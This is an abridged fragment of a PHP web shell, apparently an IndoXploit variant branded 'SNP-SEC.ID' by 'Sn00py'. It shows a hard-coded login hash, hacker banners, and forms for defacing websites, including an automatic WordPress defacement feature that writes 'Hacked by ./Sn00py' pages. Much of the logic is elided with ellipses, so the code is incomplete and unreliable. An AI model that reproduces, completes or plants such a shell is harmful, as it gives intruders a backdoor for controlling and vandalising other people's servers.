...
$auth_pass = "f55fc9719a066603197dfe4a184d906b"; // default: IndoXploit
$color = "#00ff00";
 ...
 .'`'.__ `._      `-..-''    _.'|
  \ .--.`.  `-..__    _,..-'   L|
   '    \ \      _,| |,_      /_7)
    ...
    < root@Sn00py:~# KEEP LEARN AND HAPPY HACKING >
...
<head>
<title>SNP-SEC.ID</title>
<meta name='author' content='SNP-SEC.ID'>
<meta charset="UTF-8">
<style type='text/css'>
...
if($_GET['logout'] == true) {
	...
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked by ./Sn00py</textarea><br>
	...
	if($_POST['hajar']) {
		...
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set Title: <br>
		<input type='text' name='new_title' value='Hacked by ./Sn00py' placeholder='New Title'><br><br>
	...
	if($_POST['auto_deface_wp']) {
		...
		<input type='text' name='script' height='10' size='50' placeholder='Hacked by ./Sn00py' required><br>
	...
	echo "<center>Copyright &copy; ".date("Y")." - <a href='http://indoxploit.or.id/' target='_blank'><font color=lime>SnoopySec ID</font></a></center>";
}
?>
</html>
